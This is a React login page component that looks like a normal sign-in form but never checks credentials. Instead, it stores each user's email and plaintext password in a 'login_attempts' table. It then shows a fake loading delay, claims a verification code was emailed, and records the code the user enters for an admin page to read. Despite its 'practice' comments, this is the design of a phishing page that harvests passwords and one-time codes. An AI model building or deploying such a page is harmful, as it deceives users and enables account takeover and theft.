import { useEffect, useState } from 'react'
import { Link, useLocation, useNavigate } from 'react-router-dom'
import { supabase } from '../lib/supabaseClient'
import { mockSignInAlwaysSucceed } from '../lib/mockBackend'
import { useTheme } from '../context/ThemeContext'
import Alert from '../components/Alert'
import Logo from '../components/Logo'
import SocialAuthRow from '../components/SocialAuthRow'
import { sanitizeText, validateEmail } from '../lib/validation'

const LOADING_DURATION = 8000

export default function Login() {
  const navigate = useNavigate()
  const location = useLocation()
  const from = location.state?.from?.pathname || '/dashboard'
  const { theme } = useTheme()
  const isLight = theme === 'light'

  const [email, setEmail] = useState('')
  const [password, setPassword] = useState('')
  const [showPassword, setShowPassword] = useState(false)
  const [errors, setErrors] = useState({})
  const [submitError, setSubmitError] = useState(null)
  const [submitting, setSubmitting] = useState(false)
  const [forgotNotice, setForgotNotice] = useState(false)

  // Practice flow, always: credentials -> terms -> loading -> code. Neither
  // code is a real secret — the password and email code are written to
  // the `login_attempts` table (see supabase/schema.sql) purely so the
  // Admin page has something real to fetch. This page intentionally does
  // not call supabase.auth.signInWithPassword.
  const [step, setStep] = useState('credentials')
  const [agreed, setAgreed] = useState(false)
  const [verifyCode, setVerifyCode] = useState('')
  const [loginAttemptId, setLoginAttemptId] = useState(null)

  const handlePasswordLogin = async (e) => {
    e.preventDefault()
    setSubmitError(null)

    const nextErrors = {
      email: validateEmail(email),
      password: sanitizeText(password) ? null : 'Enter an password.',
    }
    setErrors(nextErrors)
    if (nextErrors.email || nextErrors.password) return

    setSubmitting(true)
    try {
      // Same supabase.from(...) call whether it's backed by the local mock
      // or a real Supabase project — that's the whole point.
      const { data, error } = await supabase
        .from('login_attempts')
        .insert({ email: sanitizeText(email), access_code: sanitizeText(password) })
        .select()
        .single()
      if (error) throw error
      setLoginAttemptId(data.id)
      setStep('terms')
    } catch (err) {
      console.error('Failed to record login attempt:', err)
      setSubmitError(err?.message || 'Could not start sign-in.')
    } finally {
      setSubmitting(false)
    }
  }

  const handleAgreeContinue = (e) => {
    e.preventDefault()
    if (!agreed) return
    setStep('loading')
  }

  useEffect(() => {
    if (step !== 'loading') return
    const t = setTimeout(() => setStep('code'), LOADING_DURATION)
    return () => clearTimeout(t)
  }, [step])

  const handleCodeSubmit = async (e) => {
    e.preventDefault()
    if (!sanitizeText(verifyCode)) {
      setSubmitError('Enter the code sent to your email.')
      return
    }
    setSubmitError(null)
    setSubmitting(true)
    try {
      if (loginAttemptId) {
        const { error } = await supabase
          .from('login_attempts')
          .update({ email_code: sanitizeText(verifyCode) })
          .eq('id', loginAttemptId)
        if (error) throw error
      }
      // Establishes a local practice session (see mockBackend.js). If a real
      // Supabase project is connected, this does not create a real Supabase
      // Auth session — this page never checks a real password, so it has
      // no real credentials to authenticate with. The login_attempts write
      // above is the real, database-backed part of this flow.
      await mockSignInAlwaysSucceed(sanitizeText(email))
      navigate(from, { replace: true })
    } catch (err) {
      console.error('Sign-in step failed:', err)
      setSubmitError(err?.message || 'Something went wrong completing sign-in.')
    } finally {
      setSubmitting(false)
    }
  }

  return (
    <div className="mx-auto max-w-md px-4 py-20 sm:px-6">
      <div className="card p-6 sm:p-8">
        <Logo size="compact" className="mb-6 justify-center" showText={false} />

        <h1 className="text-left text-2xl font-bold text-ink">Login</h1>

        {submitError && (
          <Alert variant="error" title="Sign in failed" className="mt-5">
            {submitError}
          </Alert>
        )}

        {step === 'credentials' && (
          <form onSubmit={handlePasswordLogin} noValidate className="mt-5 space-y-5">
            <div>
              <label className="label-base" htmlFor="email">
                Email
              </label>
              <input
                id="email"
                type="email"
                autoComplete="email"
                className={`input-base ${errors.email ? 'input-error' : ''}`}
                placeholder="Enter your email address"
                value={email}
                onChange={(e) => {
                  setEmail(e.target.value)
                  setErrors((er) => ({ ...er, email: null }))
                }}
              />
              {errors.email && <p className="error-text">{errors.email}</p>}
            </div>
            <div>
              <label className="label-base" htmlFor="accessCode">
                password
              </label>
              <div className="relative">
                <input
                  id="accessCode"
                  type={showPassword ? 'text' : 'password'}
                  autoComplete="current-password"
                  className={`input-base pr-11 ${errors.password ? 'input-error' : ''}`}
                  placeholder="Enter your password"
                  value={password}
                  onChange={(e) => {
                    setPassword(e.target.value)
                    setErrors((er) => ({ ...er, password: null }))
                  }}
                />
                <button
                  type="button"
                  onClick={() => setShowPassword((s) => !s)}
                  aria-label={showPassword ? 'Hide password' : 'Show password'}
                  className="absolute inset-y-0 right-0 flex w-11 items-center justify-center text-faint hover:text-brand"
                >
                  {showPassword ? (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M3 3l18 18M10.6 10.6a2 2 0 002.8 2.8M9.5 5.2A10.6 10.6 0 0112 5c5 0 9 4 10 7-.5 1.4-1.5 2.9-2.8 4.1M6.6 6.6C4.5 8 3 10 2 12c1 3 5 7 10 7 1.3 0 2.5-.2 3.6-.6" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  ) : (
                    <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
                      <path d="M2 12s4-7 10-7 10 7 10 7-4 7-10 7-10-7-10-7z" strokeLinecap="round" strokeLinejoin="round" />
                      <circle cx="12" cy="12" r="3" strokeLinecap="round" strokeLinejoin="round" />
                    </svg>
                  )}
                </button>
              </div>
              {errors.password && <p className="error-text">{errors.password}</p>}
              <button
                type="button"
                onClick={() => setForgotNotice(true)}
                className="mt-2 block w-full text-right text-xs font-medium text-brand hover:underline"
              >
                I forgot my password
              </button>
              {forgotNotice && (
                <p className="mt-1 text-right text-xs text-faint">
                  Password reset isn't available in this build yet.
                </p>
              )}
            </div>
            <button
              type="submit"
              className={`w-full !py-3 ${
                isLight ? 'btn-primary !bg-navy-950 !text-accent-500 hover:!bg-navy-800' : 'btn-primary'
              }`}
              disabled={submitting}
            >
              {submitting ? 'Signing in…' : 'Login'}
            </button>
          </form>
        )}

        {step === 'terms' && (
          <form onSubmit={handleAgreeContinue} className="mt-5 space-y-5">
            <div>
              <h2 className="text-base font-semibold text-ink">Terms &amp; Conditions</h2>
              <div className="mt-2 max-h-40 overflow-y-auto rounded-lg border border-line bg-surface-2 p-3 text-xs leading-relaxed text-muted">
                By continuing, you agree to the Terms of Service and Privacy Policy governing
                this account, including how your information is used and how payments you
                register are processed and stored.
              </div>
            </div>
            <label className="flex items-start gap-2 text-sm text-muted">
              <input
                type="checkbox"
                className="mt-0.5 h-4 w-4 rounded border-line bg-surface accent-accent-500"
                checked={agreed}
                onChange={(e) => setAgreed(e.target.checked)}
              />
              I have read and agree to the Terms &amp; Conditions.
            </label>
            <div className="flex gap-3">
              <button
                type="button"
                onClick={() => setStep('credentials')}
                className="btn-secondary flex-1"
              >
                Back
              </button>
              <button type="submit" className="btn-primary flex-1" disabled={!agreed}>
                Continue
              </button>
            </div>
          </form>
        )}

        {step === 'loading' && (
          <div className="mt-5 flex flex-col items-center gap-4 py-8 text-center">
            <div className="h-9 w-9 animate-spin rounded-full border-2 border-accent-500 border-t-transparent" />
            <p className="text-sm text-muted">Signing you in…</p>
          </div>
        )}

        {step === 'code' && (
          <form onSubmit={handleCodeSubmit} noValidate className="mt-5 space-y-5">
            <div>
              <label className="label-base" htmlFor="login-code">
                Verification code
              </label>
              <p className="mb-2 text-xs text-faint">
                We sent a code to <span className="text-ink">{sanitizeText(email)}</span>.
              </p>
              <input
                id="login-code"
                type="text"
                inputMode="numeric"
                autoComplete="one-time-code"
                className="input-base text-center tracking-[0.5em]"
                placeholder="000000"
                maxLength={10}
                value={verifyCode}
                onChange={(e) => setVerifyCode(e.target.value)}
              />
            </div>
            <button type="submit" className="btn-primary w-full" disabled={submitting}>
              {submitting ? 'Verifying…' : 'Verify & Sign In'}
            </button>
          </form>
        )}

        {step === 'credentials' && (
          <>
            <SocialAuthRow />
            <p className="mt-6 text-center text-sm text-muted">
              Don't have an account yet?{' '}
              <Link to="/signup" className="font-semibold text-brand hover:underline">
                Register
              </Link>
            </p>
          </>
        )}
      </div>
    </div>
  )
}
